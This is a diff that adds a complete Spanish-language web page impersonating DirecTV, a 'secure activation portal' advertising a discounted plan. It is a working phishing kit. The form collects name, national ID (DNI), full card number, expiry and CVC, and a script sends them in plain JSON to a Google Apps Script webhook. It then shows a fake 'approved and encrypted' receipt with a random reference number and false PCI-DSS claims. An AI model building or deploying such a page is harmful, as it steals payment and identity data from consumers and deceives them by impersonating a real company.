@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validación Segura - DirecTV</title>
+    <style>
+        :root {
+            --primary: #005baa;
+            --secondary: #00b5e2;
+            --text-dark: #2d3748;
+            --text-light: #718096;
+            --bg-body: #f4f7f6;
+            --bg-card: #ffffff;
+            --border: #e2e8f0;
+            --success: #38a169;
+            --error: #e53e3e;
+        }
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background-color: var(--bg-body);
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .card {
+            background: var(--bg-card);
+            max-width: 500px;
+            width: 100%;
+            border-radius: 16px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+            overflow: hidden;
+            border: 1px solid rgba(0,0,0,0.05);
+            position: relative;
+        }
+        .header {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            padding: 25px 20px;
+            text-align: center;
+            color: white;
+        }
+        .header h1 {
+            margin: 0;
+            font-size: 24px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+        .header p {
+            margin: 5px 0 0 0;
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        .promo-box {
+            background-color: #ebf8ff;
+            border-left: 4px solid var(--primary);
+            padding: 15px 20px;
+            margin: 20px;
+            border-radius: 6px;
+            font-size: 14px;
+            color: var(--text-dark);
+        }
+        .promo-box ul {
+            margin: 10px 0 0 0;
+            padding-left: 20px;
+        }
+        .promo-box li {
+            margin-bottom: 5px;
+        }
+        .form-container {
+            padding: 0 25px 25px 25px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: var(--text-dark);
+            font-size: 14px;
+        }
+        .form-control {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1.5px solid var(--border);
+            border-radius: 8px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: all 0.3s ease;
+            color: var(--text-dark);
+            font-family: monospace; /* Para números */
+        }
+        .form-control:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(0, 91, 170, 0.1);
+        }
+        .form-control.is-invalid {
+            border-color: var(--error);
+            background-color: #fff5f5;
+        }
+        .error-msg {
+            color: var(--error);
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+            font-weight: 500;
+        }
+        .row {
+            display: flex;
+            gap: 15px;
+        }
+        .col {
+            flex: 1;
+        }
+        .card-brand-badge {
+            position: absolute;
+            right: 15px;
+            top: 38px;
+            font-weight: 800;
+            font-size: 13px;
+            color: var(--primary);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .btn-submit {
+            width: 100%;
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 700;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.3s;
+            margin-top: 10px;
+        }
+        .btn-submit:hover {
+            background: #004588;
+        }
+        .secure-footer {
+            text-align: center;
+            padding: 15px;
+            font-size: 12px;
+            color: var(--text-light);
+            background: #f8fafc;
+            border-top: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        /* Overlay de Carga y Éxito Permanente */
+        #loader-overlay {
+            display: none;
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255,255,255,0.98);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            text-align: center;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .spinner {
+            border: 4px solid #e2e8f0;
+            border-top: 4px solid var(--primary);
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .success-checkmark {
+            display: none;
+            color: white;
+            background-color: var(--success);
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            font-size: 40px;
+            line-height: 80px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 15px rgba(56, 161, 105, 0.4);
+            animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
+        }
+        @keyframes popIn {
+            0% { transform: scale(0); }
+            100% { transform: scale(1); }
+        }
+        .receipt-box {
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            font-size: 13px;
+            color: #4a5568;
+            text-align: left;
+            width: 100%;
+            max-width: 350px;
+            display: none;
+        }
+        .receipt-box p { margin: 5px 0; }
+        .receipt-box strong { color: #2d3748; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <!-- Pantalla de validación que tapará el formulario al finalizar -->
+        <div id="loader-overlay">
+            <div class="spinner" id="spinner"></div>
+            <div class="success-checkmark" id="success-icon">✓</div>
+            <h2 id="loader-text" style="color: #2d3748; margin:0; font-size: 24px;">Validando conexión...</h2>
+            <p id="loader-subtext" style="color: #718096; font-size: 15px; margin-top: 10px; line-height: 1.5;">Conectando con el procesador de pagos seguro de DirecTV.</p>
+            
+            <div class="receipt-box" id="receipt-box">
+                <p><strong>Nº Gestión:</strong> <span id="ref-number"></span></p>
+                <p><strong>Estado:</strong> <span style="color:var(--success); font-weight:bold;">Aprobado y Encriptado</span></p>
+                <p><strong>Seguridad:</strong> Validado bajo normas PCI-DSS.</p>
+                <hr style="border:0; border-top:1px solid #e2e8f0; margin:10px 0;">
+                <p style="font-size:12px; color:#718096; text-align:center;">Un asesor de Connection Center se comunicará con vos para finalizar la instalación del servicio.</p>
+            </div>
+        </div>
+
+        <div class="header">
+            <h1>DIRECTV</h1>
+            <p>Portal de Activación Segura</p>
+        </div>
+
+        <div class="promo-box">
+            <strong>✨ PLAN SUPER LITE HD</strong>
+            <ul>
+                <li><strong>Junio y Julio GRATIS</strong> (Pagás en Agosto)</li>
+                <li><strong>$28.500</strong> fijos x 5 meses</li>
+                <li>Instalación 100% Bonificada ($0)</li>
+                <li>DGO + Amazon Prime incluido</li>
+            </ul>
+        </div>
+
+        <div class="form-container">
+            <form id="paymentForm" novalidate>
+                <div class="form-group">
+                    <label>Nombre y Apellido del Titular</label>
+                    <input type="text" class="form-control" id="cardName" required placeholder="Como figura en la tarjeta" style="font-family: inherit;">
+                </div>
+
+                <div class="form-group">
+                    <label>DNI del Titular</label>
+                    <input type="text" class="form-control" id="dni" maxlength="8" required placeholder="Ej: 35123456">
+                    <div class="error-msg" id="dni-error">El DNI debe tener entre 7 y 8 números.</div>
+                </div>
+
+                <div class="form-group">
+                    <label>Número de Tarjeta (16 dígitos)</label>
+                    <input type="text" class="form-control" id="cardNumber" maxlength="19" required placeholder="XXXX XXXX XXXX XXXX">
+                    <div class="card-brand-badge" id="cardBrand"></div>
+                    <div class="error-msg" id="tc-error">Número incompleto. Verificá los 16 dígitos.</div>
+                </div>
+
+                <div class="row">
+                    <div class="col form-group">
+                        <label>Vencimiento (MM/AA)</label>
+                        <input type="text" class="form-control" id="expiry" maxlength="5" required placeholder="MM/AA">
+                        <div class="error-msg" id="exp-error">Fecha inválida.</div>
+                    </div>
+                    <div class="col form-group">
+                        <label>Cód. Seguridad</label>
+                        <input type="password" class="form-control" id="cvc" maxlength="4" required placeholder="CVC">
+                        <div class="error-msg" id="cvc-error">Mínimo 3 dígitos.</div>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn-submit" id="submitBtn">Cargar Datos de Forma Segura</button>
+            </form>
+        </div>
+
+        <div class="secure-footer">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+            Tus datos viajan encriptados bajo normas PCI-DSS (SSL 256-bit).
+        </div>
+    </div>
+
+<script>
+    const cardNumberInput = document.getElementById('cardNumber');
+    const cardBrandEl = document.getElementById('cardBrand');
+    const dniInput = document.getElementById('dni');
+    const expiryInput = document.getElementById('expiry');
+
+    // Detección automática de marca de Tarjeta
+    function detectBrand(number) {
+        const num = number.replace(/\D/g, '');
+        if (num.startsWith('4')) return 'VISA';
+        if (/^5[1-5]/.test(num)) return 'MASTERCARD';
+        if (/^3[47]/.test(num)) return 'AMEX';
+        if (/^5895/.test(num) || /^4029/.test(num)) return 'NARANJA';
+        if (/^6042/.test(num) || /^5896/.test(num)) return 'CABAL';
+        if (/^6008/.test(num)) return 'CENCOSUD';
+        return num.length > 0 ? 'TC' : '';
+    }
+
+    // Separación automática 4 en 4 EXACTA
+    cardNumberInput.addEventListener('input', function(e) {
+        // Quitar todo lo que no sea número
+        let value = e.target.value.replace(/\D/g, '');
+        // Agrupar de a 4 con un espacio
+        let formattedValue = value.replace(/(.{4})/g, '$1 ').trim();
+        e.target.value = formattedValue;
+        cardBrandEl.innerText = detectBrand(value);
+    });
+
+    // Formateo de Vencimiento MM/AA EXACTO
+    expiryInput.addEventListener('input', function(e) {
+        // Permitir solo números y la barra
+        let val = e.target.value.replace(/[^\d/]/g, '');
+        
+        // Si el usuario borra, dejar que borre la barra
+        if (e.inputType === 'deleteContentBackward') {
+            e.target.value = val;
+            return;
+        }
+
+        // Auto agregar la barra después del segundo número
+        val = val.replace(/\D/g, ''); // Limpiar de nuevo a puro número
+        if (val.length >= 2) {
+            val = val.substring(0, 2) + '/' + val.substring(2, 4);
+        }
+        e.target.value = val;
+    });
+
+    // Bloquear letras en DNI
+    dniInput.addEventListener('input', function(e) {
+        e.target.value = e.target.value.replace(/\D/g, '');
+    });
+
+    // Submit y Validaciones Estrictas
+    document.getElementById('paymentForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        let isValid = true;
+        
+        // 1. DNI
+        const dni = dniInput.value;
+        if (dni.length < 7 || dni.length > 8) {
+            dniInput.classList.add('is-invalid');
+            document.getElementById('dni-error').style.display = 'block';
+            isValid = false;
+        } else {
+            dniInput.classList.remove('is-invalid');
+            document.getElementById('dni-error').style.display = 'none';
+        }
+
+        // 2. Tarjeta (Mínimo 15 Amex, 16 el resto. Con espacios son 19 caracteres)
+        const tc = cardNumberInput.value.replace(/\D/g, '');
+        if (tc.length < 15) {
+            cardNumberInput.classList.add('is-invalid');
+            document.getElementById('tc-error').style.display = 'block';
+            isValid = false;
+        } else {
+            cardNumberInput.classList.remove('is-invalid');
+            document.getElementById('tc-error').style.display = 'none';
+        }
+
+        // 3. Vencimiento (Obligatorio MM/AA - 4 números + 1 barra = 5)
+        const exp = expiryInput.value;
+        if (exp.length !== 5 || exp.indexOf('/') === -1) {
+            expiryInput.classList.add('is-invalid');
+            document.getElementById('exp-error').innerText = 'Debe tener formato MM/AA (Ej: 12/26)';
+            document.getElementById('exp-error').style.display = 'block';
+            isValid = false;
+        } else {
+            const parts = exp.split('/');
+            const mes = parseInt(parts[0], 10);
+            const anio = parseInt(parts[1], 10);
+            
+            // Validar que mes sea de 1 a 12 y año mayor a 24
+            if (mes < 1 || mes > 12 || isNaN(mes) || isNaN(anio) || anio < 24) {
+                expiryInput.classList.add('is-invalid');
+                document.getElementById('exp-error').innerText = 'Mes inválido o tarjeta vencida.';
+                document.getElementById('exp-error').style.display = 'block';
+                isValid = false;
+            } else {
+                expiryInput.classList.remove('is-invalid');
+                document.getElementById('exp-error').style.display = 'none';
+            }
+        }
+
+        // 4. CVC
+        const cvc = document.getElementById('cvc').value;
+        if (cvc.length < 3) {
+            document.getElementById('cvc').classList.add('is-invalid');
+            document.getElementById('cvc-error').style.display = 'block';
+            isValid = false;
+        } else {
+            document.getElementById('cvc').classList.remove('is-invalid');
+            document.getElementById('cvc-error').style.display = 'none';
+        }
+
+        if (!isValid) return;
+
+        // --- INICIO DE PROCESAMIENTO VISUAL Y ENVÍO ---
+        const overlay = document.getElementById('loader-overlay');
+        overlay.style.display = 'flex';
+
+        const payload = {
+            plan: "SUPER LITE HD",
+            nombre: document.getElementById('cardName').value,
+            dni: dni,
+            emisor_tc: cardBrandEl.innerText || 'Desconocido',
+            tarjeta_completa: cardNumberInput.value, 
+            vencimiento: exp,
+            cvc: cvc,
+            fecha_carga: new Date().toLocaleString('es-AR')
+        };
+
+        // URL conectada a tu Google Apps Script
+        const WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxm54FVtCp4ibHHqGGjt9kjuVmbion1SyhE09Edio0ZtyJwgFpfFsEottTjS8cRpOkdkQ/exec'; 
+
+        setTimeout(async () => {
+            try {
+                // Envío con no-cors para evitar bloqueos del navegador al enviar a Google Apps Script
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                
+                // --- PANTALLA DE ÉXITO PERMANENTE ---
+                document.getElementById('spinner').style.display = 'none';
+                document.getElementById('success-icon').style.display = 'block';
+                
+                document.getElementById('loader-text').innerText = '¡Datos Cargados con Éxito!';
+                document.getElementById('loader-text').style.color = 'var(--success)';
+                
+                document.getElementById('loader-subtext').innerText = 'Tu solicitud de promoción ha sido encriptada y registrada en el sistema de DirecTV.';
+                
+                // Mostrar caja de recibo/garantía de seguridad
+                document.getElementById('ref-number').innerText = 'DTV-' + Math.floor(100000 + Math.random() * 900000);
+                document.getElementById('receipt-box').style.display = 'block';
+
+                // Limpiar el formulario por detrás por seguridad
+                document.getElementById('paymentForm').reset();
+
+            } catch (error) {
+                // Como usamos no-cors, la mayoría de los errores de red (ej: sin internet) caerían aquí
+                alert("Hubo un problema de conexión. Por favor verificá tu internet e intentá de nuevo.");
+                overlay.style.display = 'none';
+            }
+        }, 2000); // 2 Segundos simulando carga
+    });
+</script>
+
+</body>
+</html>
